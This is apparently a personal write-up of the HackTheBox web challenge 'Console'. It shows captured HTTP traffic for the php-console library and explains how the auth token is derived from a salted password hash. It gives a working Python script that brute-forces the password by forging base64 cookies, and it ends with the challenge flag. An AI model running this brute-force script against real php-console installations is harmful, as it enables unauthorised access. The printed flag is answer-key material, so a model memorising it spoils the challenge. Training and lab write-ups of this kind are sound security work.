---
Category:
  - Web
Difficulty: Medium
Platform: HackTheBox
Status: 3. Complete
tags: [brute-force, code-review, python-coding, reversing]
---
>[!summary]
>*Could you please check the console of your Chrome?*


# Set up

- 

# Information Gathering

Opening the challenge a default PHP page is showed:

![console-1.png](../../zzz_res/attachments/console-1.png)

The sentence below is non standard in PHP:

> Make sure to load php-console in order to be prompted for a password


- php-console (PHP Console server library): [https://github.com/barbushin/php-console](https://github.com/barbushin/php-console)
- php-console-extension: [https://github.com/barbushin/php-console-extension](https://github.com/barbushin/php-console-extension)

Download and import the extension within chromium:

![console-2.png](../../zzz_res/attachments/console-2.png)

Visit the challenge page and test the extension:

![console-3.png](../../zzz_res/attachments/console-3.png)

![console-4.png](../../zzz_res/attachments/console-4.png)

HTTP Request (pw: `test`):

```
GET / HTTP/1.1
Host: 138.68.155.238:30717
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: <http://138.68.155.238:30717/>
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: php-console-server=5; php-console-client=eyJwaHAtY29uc29sZS1jbGllbnQiOjUsImF1dGgiOnsicHVibGljS2V5IjoiMDIzNzRhMTIyMzg3YjNmMDZjYTgzNWZiNDA3ZWQxYzc3ZDY3YThlZjMwY2E5ZWFmZjBmMTNkOTE4NDgzYzkwOCIsInRva2VuIjoiOWRlNDQxMjNkYzk5MGJmYTIwZjllNjM5N2YzN2M5ZmFiYjlkNTIwMTk3YjFjNDAzMDkzNTYxYjVmYjE1ZDRlMCJ9fQ==
```

```json
php-console-client = {"php-console-client":5,"auth":{"publicKey":"02374a122387b3f06ca835fb407ed1c77d67a8ef30ca9eaff0f13d918483c908","token":"9de44123dc990bfa20f9e6397f37c9fabb9d520197b1c403093561b5fb15d4e0"}}
```

HTTP Response:

```
HTTP/1.1 200 OK
Date: Fri, 10 Sep 2021 09:38:50 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.34
PHP-Console-Postpone: {"protocol":5,"isPostponed":true,"id":"543866480751852544435350167"}
PHP-Console: {"protocol":5,"auth":{"publicKey":"02374a122387b3f06ca835fb407ed1c77d67a8ef30ca9eaff0f13d918483c908","isSuccess":false},"docRoot":null,"sourcesBasePath":null,"getBackData":null,"isLocal":null,"isSslOnlyMode":false,"isEvalEnabled":null,"messages":[]}
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 10712
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

HTTP request (pw: `test2`):

```
GET / HTTP/1.1
Host: 138.68.155.238:30717
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: <http://138.68.155.238:30717/>
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: php-console-server=5; php-console-client=eyJwaHAtY29uc29sZS1jbGllbnQiOjUsImF1dGgiOnsicHVibGljS2V5IjoiMDIzNzRhMTIyMzg3YjNmMDZjYTgzNWZiNDA3ZWQxYzc3ZDY3YThlZjMwY2E5ZWFmZjBmMTNkOTE4NDgzYzkwOCIsInRva2VuIjoiZDEzYmM2NzQ5ODNmZjMwMTdiZDYwODIzMTEzMGVlNjliNDY2NGNhNmI3ODM4N2M5YjQ2ZGE2MWI4ZTI2MzMyOSJ9fQ==

```

```json
php-console-client = {"php-console-client":5,"auth":{"publicKey":"02374a122387b3f06ca835fb407ed1c77d67a8ef30ca9eaff0f13d918483c908","token":"d13bc674983ff3017bd608231130ee69b4664ca6b78387c9b46da61b8e263329"}}
```

HTTP response:

```
HTTP/1.1 200 OK
Date: Fri, 10 Sep 2021 09:41:40 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.34
PHP-Console-Postpone: {"protocol":5,"isPostponed":true,"id":"15213328251665622270599337835"}
PHP-Console: {"protocol":5,"auth":{"publicKey":"02374a122387b3f06ca835fb407ed1c77d67a8ef30ca9eaff0f13d918483c908","isSuccess":false},"docRoot":null,"sourcesBasePath":null,"getBackData":null,"isLocal":null,"isSslOnlyMode":false,"isEvalEnabled":null,"messages":[]}
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 10712
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

# The bug

```bash
┌──(kali㉿kali)-[~/…/HTB/challenge/web/Console]
└─$ cat cookie1
{"php-console-client":5,"auth":{"publicKey":"02374a122387b3f06ca835fb407ed1c77d67a8ef30ca9eaff0f13d918483c908","token":"9de44123dc990bfa20f9e6397f37c9fabb9d520197b1c403093561b5fb15d4e0"}}

┌──(kali㉿kali)-[~/…/HTB/challenge/web/Console]
└─$ cat cookie2
{"php-console-client":5,"auth":{"publicKey":"02374a122387b3f06ca835fb407ed1c77d67a8ef30ca9eaff0f13d918483c908","token":"d13bc674983ff3017bd608231130ee69b4664ca6b78387c9b46da61b8e263329"}}

┌──(kali㉿kali)-[~/…/HTB/challenge/web/Console]
└─$ cat cookie1-same
{"php-console-client":5,"auth":{"publicKey":"02374a122387b3f06ca835fb407ed1c77d67a8ef30ca9eaff0f13d918483c908","token":"9de44123dc990bfa20f9e6397f37c9fabb9d520197b1c403093561b5fb15d4e0"}}

```

`publicKey` is static: `02374a122387b3f06ca835fb407ed1c77d67a8ef30ca9eaff0f13d918483c908php-console-client` only differs in token (which is related to the password):

Based on these info we can brute-force the password by re-implementing the logic for the token generation. Because we have access to the [client source-code](https://github.com/barbushin/php-console-extension/blob/master/js/auth.js) and [server source-code](https://github.com/barbushin/php-console/blob/master/src/PhpConsole/Auth.php), we can use it to develop our custom script.

## Exploitation

```json
{
"php-console-client" : 5,
"auth":
	{
	"publicKey" : SHA256($_SERVER['REMOTE_ADDR'] + SHA256(psw + 'NeverChangeIt:)'),
	"token": SHA256(SHA256(psw + 'NeverChangeIt:)') + SHA256($_SERVER['REMOTE_ADDR'] + SHA256(psw + 'NeverChangeIt:)'))
	}
}

```

Exploit:

```python
#/usr/bin/env python
from hashlib import sha256
from sys import argv
import base64
import requests
import json

publicKey = "02374a122387b3f06ca835fb407ed1c77d67a8ef30ca9eaff0f13d918483c908"
PASSWORD_HASH_SALT = 'NeverChangeIt:)'
url = argv[1]

print(f"Brute-forcing php-client password for {url}")
print(f"publicKey: {publicKey}")

file = open(argv[2],"r")
for line in file:
	psw = line.strip()
	print(f"Testing: {psw}")
	psw_hash = sha256(psw.strip().encode() + PASSWORD_HASH_SALT.strip().encode())
	print(f"Hash: {psw_hash.hexdigest()}")

	# "token": SHA256(SHA256(psw + 'NeverChangeIt:)') + SHA256($_SERVER['REMOTE_ADDR'] + SHA256(psw + 'NeverChangeIt:)'))
	token = sha256(sha256(psw.strip().encode() + PASSWORD_HASH_SALT.strip().encode()).hexdigest().encode() + publicKey.strip().encode())
	print(f"Token: {token.hexdigest()}")

	php_console_client = '{"php-console-client":5,"auth":{"publicKey":"'+publicKey+'","token":"'+token.hexdigest()+'"}}'
	b64_php_console_client = base64.b64encode(php_console_client.encode('ascii'))
	#print(b64_php_console_client.decode())

	cookies_dict = {"php-console-server":"5", "php-console-client":b64_php_console_client.decode()}
	#print(cookies_dict)

	resp = requests.get(url, cookies=cookies_dict)
	php_console = resp.headers["PHP-Console"]
	php_console_json = json.loads(php_console)

	if php_console_json["auth"]["isSuccess"]:
		print(f"Passowrd found! {psw}")
		print(f"Flag is: {php_console_json['messages']['data']}")
		break

```

![console-5.png](../../zzz_res/attachments/console-5.png)

![console-6.png](../../zzz_res/attachments/console-6.png)

## Flag

>[!success]
>`HTB{PhP!Cons0lE@ByTh3K+FoUnd+}`

